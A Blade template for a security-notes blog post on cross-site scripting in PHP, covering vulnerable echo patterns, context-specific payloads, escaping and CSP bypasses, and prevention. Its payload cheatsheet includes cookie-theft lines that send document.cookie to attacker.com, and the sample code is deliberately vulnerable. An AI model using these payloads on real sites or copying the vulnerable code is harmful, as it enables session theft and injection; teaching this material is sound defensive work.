@extends('layouts.app')
@section('title', 'XSS in PHP Applications - Notes')
@section('content')
<style>
    @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500&display=swap');
    :root{--bg:#0a0e17;--surface:#0f1522;--border:#1e2d45;--accent:#00c2ff;--accent2:#7b61ff;--text:#c9d8ef;--muted:#566a85;--green:#00e5a0;--red:#ff4d6d;--yellow:#f0b429;--orange:#ff9f43;}
    .post-root{background:var(--bg);font-family:'Syne',sans-serif;min-height:100vh;color:var(--text);}
    .post-topbar{border-bottom:1px solid var(--border);background:var(--surface);padding:12px 0;position:sticky;top:0;z-index:50;backdrop-filter:blur(8px);}
    .post-topbar-inner{max-width:960px;margin:0 auto;padding:0 32px;}
    .breadcrumb{display:flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);flex-wrap:wrap;}
    .breadcrumb a{color:var(--muted);text-decoration:none;} .breadcrumb a:hover{color:var(--accent);} .breadcrumb-sep{opacity:.35;font-size:10px;} .breadcrumb-current{color:var(--text);}
    .post-body{max-width:960px;margin:0 auto;padding:48px 32px 100px;}
    .article-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;}
    .article-card-inner{padding:48px;}
    .cat-badge{display:inline-flex;align-items:center;gap:7px;font-family:'IBM Plex Mono',monospace;font-size:10px;padding:4px 12px;border-radius:3px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:24px;background:rgba(255,159,67,0.1);color:var(--orange);border:1px solid rgba(255,159,67,0.25);}
    .article-title{font-size:clamp(26px,4vw,38px);font-weight:800;color:#fff;line-height:1.15;letter-spacing:-.02em;margin-bottom:20px;}
    .meta-row{display:flex;flex-wrap:wrap;gap:20px;margin-bottom:28px;padding-bottom:28px;border-bottom:1px solid var(--border);}
    .meta-item{display:flex;align-items:center;gap:7px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);} .meta-item svg{width:13px;height:13px;}
    .read-btn{display:inline-flex;align-items:center;gap:8px;background:transparent;border:1px solid var(--border);border-radius:6px;padding:9px 18px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--text);cursor:pointer;transition:all .2s;margin-bottom:40px;} .read-btn:hover{border-color:var(--orange);color:var(--orange);}
    .article-prose{line-height:1.8;font-size:15px;color:var(--text);}
    .article-prose h2{font-size:24px;font-weight:800;color:#fff;margin:48px 0 20px;}
    .article-prose h3{font-size:18px;font-weight:700;color:var(--orange);margin:40px 0 16px;font-family:'IBM Plex Mono',monospace;display:flex;align-items:center;gap:10px;} .article-prose h3::before{content:'//';color:var(--accent2);font-size:14px;opacity:.7;}
    .article-prose p{margin-bottom:16px;} .article-prose strong{color:#fff;} .article-prose a{color:var(--accent);text-decoration:underline;}
    .article-prose ul{list-style:none;padding:0;margin-bottom:20px;display:flex;flex-direction:column;gap:10px;} .article-prose ul li{padding-left:20px;position:relative;} .article-prose ul li::before{content:'›';position:absolute;left:0;color:var(--orange);font-size:16px;line-height:1.6;}
    .article-prose pre{background:#060a12;border:1px solid var(--border);border-radius:8px;padding:20px 24px;overflow-x:auto;margin:24px 0;position:relative;} .article-prose pre code{font-family:'IBM Plex Mono',monospace;font-size:13px;color:#00e5a0;background:none;padding:0;}
    .article-prose code{font-family:'IBM Plex Mono',monospace;font-size:13px;background:rgba(255,159,67,0.08);color:var(--orange);padding:2px 7px;border-radius:3px;border:1px solid rgba(255,159,67,0.2);}
    .copy-code{position:absolute!important;top:10px;right:10px;background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--muted);padding:4px 10px;font-family:'IBM Plex Mono',monospace;font-size:10px;cursor:pointer;} .copy-code:hover{border-color:var(--orange);color:var(--orange);} .copy-code.copied{border-color:var(--green);color:var(--green);}
    .callout{border-radius:8px;padding:18px 22px;margin:24px 0;display:flex;gap:14px;align-items:flex-start;} .callout-icon{font-size:18px;flex-shrink:0;margin-top:2px;} .callout p{margin:0;font-size:14px;line-height:1.7;} .callout strong{font-weight:700;}
    .callout-warning{background:rgba(240,180,41,0.06);border:1px solid rgba(240,180,41,0.25);} .callout-warning p{color:#f5d67a;} .callout-warning strong{color:var(--yellow);}
    .callout-info{background:rgba(255,159,67,0.05);border:1px solid rgba(255,159,67,0.2);} .callout-info p{color:var(--text);} .callout-info strong{color:var(--orange);}
    .callout-success{background:rgba(0,229,160,0.05);border:1px solid rgba(0,229,160,0.25);} .callout-success p{color:#7ff3cd;} .callout-success strong{color:var(--green);}
    .callout-danger{background:rgba(255,77,109,0.05);border:1px solid rgba(255,77,109,0.25);} .callout-danger p{color:#ffb3c0;} .callout-danger strong{color:var(--red);}
    @media(max-width:768px){.post-body{padding:24px 16px 60px;}.article-card-inner{padding:24px;}.post-topbar-inner{padding:0 16px;}}
</style>

<div class="post-root">
    <div class="post-topbar"><div class="post-topbar-inner">
        <nav class="breadcrumb">
            <a href="{{ route('home') }}">Home</a><span class="breadcrumb-sep">›</span>
            <a href="{{ route('posts.index') }}">Notes</a><span class="breadcrumb-sep">›</span>
            <a href="{{ route('posts.index') }}?category=php">PHP Security</a><span class="breadcrumb-sep">›</span>
            <span class="breadcrumb-current">XSS in PHP</span>
        </nav>
    </div></div>

    <div class="post-body"><div class="article-card"><div class="article-card-inner">
        <div><span class="cat-badge">PHP Security</span></div>
        <h1 class="article-title">Cross-Site Scripting (XSS) in PHP Applications</h1>
        <div class="meta-row">
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>Youssef</div>
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>{{ now()->format('d M Y') }}</div>
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>0 views</div>
        </div>
        <button id="read-btn" class="read-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>Read Aloud</button>

        <div class="article-prose" id="article-content">

            <h2>XSS in PHP Applications</h2>

            <h3>Types of XSS</h3>
            <ul>
                <li><strong>Reflected XSS</strong> — payload is in the request, echoed immediately in the response</li>
                <li><strong>Stored XSS</strong> — payload is saved in the database, executed when other users view it</li>
                <li><strong>DOM-based XSS</strong> — payload is processed client-side by JavaScript, never touches the server</li>
            </ul>

            <h3>Basic Reflected XSS in PHP</h3>
            <pre><code>// VULNERABLE
echo "Search results for: " . $_GET['q'];

// Payload: ?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
// Payload: ?q=&lt;img src=x onerror=alert(1)&gt;
// Payload: ?q=&lt;svg onload=alert(1)&gt;</code></pre>

            <h3>Stored XSS</h3>
            <pre><code>// VULNERABLE — comment stored in DB then displayed without encoding
$comment = $_POST['comment'];
$db->query("INSERT INTO comments (text) VALUES ('$comment')");

// Later displayed:
echo $row['text'];  // stored XSS payload executes for every visitor</code></pre>

            <h3>Context-Aware Injection</h3>
            <p>The injection context determines what payload works. Different HTML contexts require different payloads:</p>
            <pre><code>// Context 1: HTML body — standard tag injection
echo "&lt;p&gt;" . $input . "&lt;/p&gt;";
// Payload: &lt;script&gt;alert(1)&lt;/script&gt;

// Context 2: HTML attribute
echo '&lt;input value="' . $input . '"&gt;';
// Payload: "&gt;&lt;script&gt;alert(1)&lt;/script&gt;
// Payload: " onmouseover="alert(1)

// Context 3: JavaScript string
echo "&lt;script&gt;var x = '" . $input . "';&lt;/script&gt;";
// Payload: '; alert(1); //
// Payload: \'; alert(1); //

// Context 4: href attribute
echo '&lt;a href="' . $input . '"&gt;click&lt;/a&gt;';
// Payload: javascript:alert(1)

// Context 5: Inside style tag
echo '&lt;style&gt;body { background: ' . $input . '; }&lt;/style&gt;';
// Payload: red; } body { background: url(javascript:alert(1))</code></pre>

            <h3>Bypassing htmlspecialchars()</h3>
            <p><code>htmlspecialchars()</code> is commonly used but can still be bypassed if misconfigured or used in the wrong context.</p>
            <pre><code>// WRONG — missing ENT_QUOTES flag (only escapes < > & " but not ')
echo htmlspecialchars($input);   // default flags

// In single-quoted attribute — still injectable!
echo "&lt;/input value='" . htmlspecialchars($input) . "'&gt;";
// Payload: ' onmouseover='alert(1)   — single quote not escaped!

// CORRECT — always use ENT_QUOTES and specify charset
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// CORRECT for attribute context:
echo '&lt;input value="' . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . '"&gt;';</code></pre>

            <h3>Bypassing filter_var()</h3>
            <pre><code>// filter_var with FILTER_SANITIZE_STRING is deprecated and unreliable
$clean = filter_var($input, FILTER_SANITIZE_STRING);
// Still vulnerable to many payloads

// filter_var for URLs — doesn't prevent XSS
$url = filter_var($_GET['url'], FILTER_VALIDATE_URL);
// "javascript:alert(1)" is a valid URL! → XSS in href</code></pre>

            <h3>XSS Payload Cheatsheet</h3>
            <pre><code>// Basic
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;

// Attribute injection
" onmouseover="alert(1)&gt;
" onfocus="alert(1)" autofocus="

// Tag bypass
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;
&lt;body onload=alert(1)&gt;
&lt;iframe src="javascript:alert(1)"&gt;
&lt;details open ontoggle=alert(1)&gt;

// Filter bypass
&lt;script&gt;alert(1)&lt;/script&gt;          // case variation
&lt;scr&lt;script&gt;ipt>alert(1)&lt;/script&gt;   // nested tag
&lt;img src=x onerror="&#97;lert(1)"&gt;  // HTML entities
&lt;img src=x onerror="\u0061lert(1)"&gt; // unicode escape

// Cookie steal
&lt;script&gt;fetch('https://attacker.com/?c='+document.cookie)&lt;/script&gt;
&lt;img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie"&gt;</code></pre>

            <h3>Content Security Policy (CSP) Bypass</h3>
            <pre><code>// Weak CSP: script-src 'unsafe-inline' — useless
// Weak CSP: script-src * — allows any domain

// Bypass via allowed CDN
// If CSP allows cdn.jsdelivr.net:
&lt;script src="https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js"&gt;&lt;/script&gt;
&lt;div ng-app ng-csr-no-unsafe-eval&gt;&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125;&lt;/div&gt;

// Bypass via base tag injection
// If base-uri is not restricted:
&lt;base href="https://attacker.com/"&gt;   // redirects all relative script loads</code></pre>

            <h3>Prevention</h3>
            <pre><code>// 1. Context-aware output encoding (always)
echo htmlspecialchars($val, ENT_QUOTES, 'UTF-8');  // HTML context
echo json_encode($val);                             // JS context

// 2. Content Security Policy header
header("Content-Security-Policy: default-src 'self'; script-src 'self'");

// 3. HttpOnly cookie flag — XSS can't steal the cookie
session_set_cookie_params(['httponly' => true, 'secure' => true]);

// 4. X-XSS-Protection (legacy browsers)
header("X-XSS-Protection: 1; mode=block");

// 5. Use a template engine with auto-escaping (Twig, Blade)
&#123;&#123; $variable &#125;&#125;     // Blade auto-escapes
&#123;&#123;!! $variable !!&#125;&#125;   // Blade raw — DANGEROUS, only when necessary</code></pre>

            <div class="callout callout-success">
                <div class="callout-icon">✅</div>
                <p><strong>Key Rule:</strong> Always encode output based on the context it appears in. HTML body, HTML attributes, JavaScript, CSS, and URL contexts each require different encoding. <code>htmlspecialchars()</code> alone is not sufficient for JavaScript or URL contexts.</p>
            </div>

        </div>
    </div></div></div>
</div>
@endsection
@section('scripts')
<script>
document.addEventListener('DOMContentLoaded',function(){document.querySelectorAll('pre').forEach(pre=>{pre.style.position='relative';const btn=document.createElement('button');btn.className='copy-code';btn.textContent='copy';pre.appendChild(btn);btn.addEventListener('click',()=>{const code=pre.querySelector('code')?.textContent??pre.textContent;navigator.clipboard.writeText(code).then(()=>{btn.textContent='copied!';btn.classList.add('copied');setTimeout(()=>{btn.textContent='copy';btn.classList.remove('copied');},2000);});});});const r=document.getElementById('read-btn');const c=document.getElementById('article-content');if(r&&c){let reading=false;r.addEventListener('click',()=>{if(!reading){const u=new SpeechSynthesisUtterance(c.innerText);u.lang='en-US';speechSynthesis.speak(u);reading=true;r.textContent='Stop';u.onend=()=>{reading=false;r.textContent='Read Aloud'};}else{speechSynthesis.cancel();reading=false;r.textContent='Read Aloud';}});}});
</script>
@endsection
